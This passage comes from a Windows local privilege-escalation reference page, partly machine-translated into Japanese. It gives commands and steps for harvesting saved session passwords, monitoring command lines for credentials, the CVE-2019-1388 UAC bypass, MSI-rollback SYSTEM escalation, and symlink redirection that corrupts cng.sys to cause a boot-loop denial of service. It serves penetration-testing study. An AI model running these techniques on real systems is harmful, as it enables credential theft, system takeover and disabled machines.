ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータを clear text で保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の **sessions**, **usernames** および **passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[この脆弱性を検出して悪用する方法の詳細についてはこの例をお読みください。](leaked-handle-exploitation.md)\
[異なる権限レベル（full access に限定されない）で継承されたプロセスやスレッドの open handle をテスト／悪用する方法をより詳しく説明した別の記事はこちらです。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. このような攻撃を実行する手順については、次のガイドを参照してください：[**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system)。

また、以下のツールは **burp のようなツールで named pipe の通信をインターセプトする** のに使えます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこのツールは privescs を見つけるためにすべてのパイプを一覧表示して確認することができます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェイス（console または RDP 経由）にアクセスでき、UAC が有効な場合、いくつかの Microsoft Windows のバージョンでは、低権限ユーザーから NT\AUTHORITY SYSTEM のようなターミナルや他のプロセスを実行することが可能です。

これにより、同じ脆弱性を利用して権限昇格と UAC のバイパスを同時に行うことができます。さらに、何もインストールする必要がなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの例は次のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator の Medium から High への Integrity Level 昇格 / UAC バイパス

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 任意フォルダの削除/移動/リネームから SYSTEM EoP へ

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

この攻撃は基本的に Windows Installer の rollback 機能を悪用し、アンインストール中に正規ファイルを悪意あるものと置き換えるものです。これには攻撃者が `C:\Config.Msi` フォルダをハイジャックするための **malicious MSI installer** を作成する必要があります。`C:\Config.Msi` は他の MSI パッケージのアンインストール時に、rollback ファイルを格納するために Windows Installer によって使用され、これらの rollback ファイルが悪意のあるペイロードを含むように改変されます。

手順の要約は以下の通りです：

1. **Stage 1 – ハイジャックの準備（`C:\Config.Msi` を空のままにする）**

- ステップ 1: MSI をインストール
- 書き込み可能なフォルダ（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成する。
- インストーラに **"UAC Compliant"** とマークし、**管理者権限を持たないユーザー**でも実行できるようにする。
- インストール後にそのファイルへの **handle** を開いたままにする。

- ステップ 2: アンインストールを開始
- 同じ `.msi` をアンインストールする。
- アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback のバックアップ）にリネームし始める。
- **開いたファイルハンドルをポーリング**し、`GetFinalPathNameByHandle` を使ってファイルが `C:\Config.Msi\<random>.rbf` になったタイミングを検出する。

- ステップ 3: カスタム同期
- その `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、以下を行う:
- `.rbf` が書き込まれたことをシグナルする。
- その後、アンインストールを続行する前に別のイベントで **待機する**。

- ステップ 4: `.rbf` の削除をブロック
- シグナルを受けたら、`FILE_SHARE_DELETE` なしで **`.rbf` ファイルを開く** — これにより **削除を防止する**。
- その後、アンインストールを完了させるために **シグナルを返す**。
- Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため、**`C:\Config.Msi` は削除されない**。

- ステップ 5: `.rbf` を手動で削除
- 攻撃者は `.rbf` ファイルを手動で削除する。
- これで **`C:\Config.Msi` が空になり**、ハイジャックの準備が整う。

> この時点で、**trigger the SYSTEM-level arbitrary folder delete vulnerability** を発動して `C:\Config.Msi` を削除する。

2. **Stage 2 – rollback スクリプトを悪意あるものに置き換える**

- ステップ 6: 弱い ACL で `C:\Config.Msi` を再作成
- 自分で `C:\Config.Msi` フォルダを再作成する。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` で **ハンドルを開いたままにする**。

- ステップ 7: 別のインストールを実行
- 再度 `.msi` をインストールする。オプションは:
- `TARGETDIR`: 書き込み可能な場所。
- `ERROROUT`: 強制失敗を引き起こす変数。
- このインストールは再び **rollback** を引き起こすために使用され、`.rbs` と `.rbf` を読み取る。

- ステップ 8: `.rbs` を監視
- 新しい `.rbs` が現れるまで `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視する。
- そのファイル名を取得する。

- ステップ 9: ロールバック前の同期
- その `.msi` は **custom install action (`SyncBeforeRollback`)** を含み、以下を行う:
- `.rbs` が作成されたときにイベントをシグナルする。
- その後、続行する前に **待機する**。

- ステップ 10: 弱い ACL を再適用
- `.rbs created` イベントを受け取った後:
- Windows Installer は `C:\Config.Msi` に対して **強い ACL を再設定する**。
- しかし、`WRITE_DAC` を持つハンドルを保持しているので、再び **weak ACLs を適用できる**。

> ACL は **handle open 時にのみ適用される** ため、フォルダへの書き込みは依然可能である。

- ステップ 11: 偽の `.rbs` と `.rbf` を配置
- Windows に対して次を指示する **fake rollback script** で `.rbs` ファイルを上書きする:
- あなたの `.rbf` ファイル（悪意ある DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
- 悪意ある SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を配置する。

- ステップ 12: ロールバックをトリガー
- インストーラが再開するように同期イベントにシグナルを送る。
- 既知のポイントでインストールを **意図的に失敗させる** ように、**type 19 custom action (`ErrorOut`)** が設定されている。
- これにより **rollback が開始される**。

- ステップ 13: SYSTEM があなたの DLL をインストール
- Windows Installer:
- 悪意ある `.rbs` を読み取る。
- `.rbf` の DLL をターゲットの場所へコピーする。
- これで **SYSTEM によりロードされるパスに悪意ある DLL を配置** できる。

最終ステップ: SYSTEM コードを実行
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、ハイジャックした DLL を読み込ませる。
- **Boom**: あなたのコードが **SYSTEM として実行される**。


### 任意ファイルの削除/移動/リネームから SYSTEM EoP へ

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除すると**、NTFSはファイルシステムからフォルダ全体を**削除します**。

次のような標準のファイル削除APIを使用して実行できます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、それは**フォルダ自体を削除します**。

### Folder Contents Delete から SYSTEM EoP へ
primitive が任意のファイル/フォルダを削除できない場合でも、攻撃者が制御するフォルダの*中身*を**削除できる**のであればどうしますか？

1. Step 1: ベイトフォルダとファイルをセットアップ
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を配置
- The oplock **実行を一時停止します** when a privileged process tries to delete `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガー（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock triggers** が発生してコールバックに制御を渡します。

4. ステップ 4: oplock callback 内で – 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これにより `folder1` が空になり、oplock は壊れません。
- `file1.txt` を直接削除しないでください — それは oplock を早期に解除してしまいます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS の内部ストリームを標的にしており — それを削除するとフォルダ自体が削除されます。

5. ステップ5: oplock を解放する
- SYSTEM プロセスは継続して `file1.txt` を削除しようとします。
- しかし今や、junction + symlink のため、実際に削除しているのは:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意フォルダ作成から恒久的なDoSへ

**任意のフォルダをSYSTEM/adminとして作成する**プリミティブを悪用する — たとえ**ファイルを書き込めない**場合や**弱い権限を設定できない**場合でも。

例えば、**フォルダ**（ファイルではなく）を**critical Windows driver** の名前で作成する、例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- もしそれを **フォルダとして事前に作成しておくと**, Windows は起動時に実際のドライバを読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダを見つけ、**実際のドライバを解決できずに**、**クラッシュするか起動が停止します**。
- **代替手段はない**、そして外部の介入（例: ブート修復やディスクアクセス）がない限り**回復できない**。

### 特権ログ/バックアップパス + OM symlinks から arbitrary file overwrite / boot DoS へ

特権サービスが**書き込み可能な設定**から読み取ったパスにログ/エクスポートを書き込む場合、そのパスを **Object Manager symlinks + NTFS mount points** でリダイレクトして、特権による書き込みを任意の上書きに変換できます（**SeCreateSymbolicLinkPrivilege** がなくても）。

**要件**
- ターゲットパスを保持する設定が攻撃者に書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` へのマウントポイントと OM のファイルシンボリックリンクを作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに書き込む特権操作が存在すること（ログ、エクスポート、レポート）。

**例: 攻撃チェーン**
1. 設定を読み取り、特権ログの宛先を取得する。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでそのパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: 管理者が "send test SMS" をトリガーする）。書き込みは現在 `C:\Windows\System32\cng.sys` に到達する。
4. 上書きされたターゲット（hex/PE parser）を検査して破損を確認する；再起動により Windows が改竄されたドライバパスを読み込むことを強制され → **ブートループ DoS**。これは、特権サービスが書き込みのために開く任意の保護されたファイルにも一般化する。

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する際は、それが有効な service であるか、またはバイナリが必要な処理を素早く実行することを確認してください。そうでない場合は20sで kill されます。

### AlwaysInstallElevated

High Integrity プロセスから、AlwaysInstallElevated registry entries を enable し、.msi wrapper を使って reverse shell を install してみてください。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちら**](seimpersonate-from-high-to-system.md)**で確認できます。**

### From SeDebug + SeImpersonate to Full Token privileges

もしこれらの token privileges を持っていれば（おそらく既に High Integrity process 内で見つかることが多い）、SeDebug privilege を使ってほとんどのプロセス（protected processes を除く）を open し、そのプロセスの token を copy して、その token を使って arbitrary process を作成できます。\
この技術では通常、全ての token privileges を持つ SYSTEM として動作しているプロセスを選択します（はい、すべての token privileges を持たない SYSTEM プロセスも存在します）。\
**例のコードは** [**こちら**](sedebug-+-seimpersonate-copy-token.md)**で確認できます。**

### **Named Pipes**

この技術は meterpreter が getsystem を行う際に使用されます。手法は pipe を作成し、service を作成/悪用してその pipe に書き込ませることから成ります。すると、`SeImpersonate` privilege を使用して pipe を作成した server は pipe client（service）の token を impersonate でき、SYSTEM privileges を取得できます。\
name pipes についてもっと学びたい場合は [**こちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使って high integrity から System へ移行する例を読みたい場合は [**こちら**](from-high-integrity-to-system-with-name-pipes.md) を参照してください。

### Dll Hijacking

もし SYSTEM として動作している process によって load される dll を hijack できれば、その権限で arbitrary code を実行できます。したがって Dll Hijacking はこの種の privilege escalation に有用であり、さらに high integrity process から達成する方がはるかに容易です。なぜなら high integrity process は dll をロードするためのフォルダに write permissions を持っているからです。\
**詳細は** [**こちら**](dll-hijacking/index.html)**を参照してください。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

参照: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows のローカル privilege escalation ベクトルを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックする（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの設定ミスをチェックして情報を収集する（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックする**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP の保存セッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメインに対してスプレーする**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ベースの ADIDNS/LLMNR/mDNS スプーファーおよび中間者ツール。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc Windows 列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~ -- 既知の privesc 脆弱性を検索する（Watson によって非推奨）~~**\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin 権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc 脆弱性を検索する（VisualStudio でコンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して設定ミスを探索する（privesc というより情報収集ツール）（コンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)）\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出する（GitHub にプリコンパイル exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp を C# に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~ -- 設定ミスをチェックする（GitHub に実行ファイルがプリコンパイル）。推奨されません。Win10 ではあまり動作しません。~~**\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な設定ミスをチェックする（python からの exe）。推奨されません。Win10 ではあまり動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（accesschk がなくても正常に動作しますが、利用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET を使ってコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには次のようにします：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
